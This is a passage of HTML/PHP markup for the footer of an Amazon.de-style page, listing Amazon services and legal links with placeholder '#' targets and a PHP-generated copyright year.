style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> MYHABIT<br><span class="navFooterDescText"> Private Modeschöpfer<br>Verkäufe </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Prime Now<br><span class="navFooterDescText"> 1-Stunden-Lieferung<br>Tausender Produkte </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Shopbop<br><span class="navFooterDescText"> Designer<br>Modemarken </span> </a> </td> </tr> <tr><td>&nbsp;</td></tr> <tr> <td class="navFooterDescItem"> &nbsp; </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Warehouse Deals<br><span class="navFooterDescText"> Reduzierte B-Ware<br></span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> ZVAB<br><span class="navFooterDescText"> Zentrales Verzeichnis<br>Antiquarischer Bücher und mehr </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> LOVEFiLM<br><span class="navFooterDescText"> DVD &amp; Blu-ray<br>Verleih per Post </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> &nbsp; </td> </tr> </tbody></table> </div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"> <ul> <li class="nav_first"> <a href="#" class="nav_a">Unsere AGB</a> </li> <li> <a href="#" class="nav_a">Datenschutzerklärung</a> </li> <li> <a href="#" class="nav_a">Impressum</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Cookies &amp; Internet-Werbung</a> </li> </ul> <span>© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</span> </div> </div>
	</body>
</html>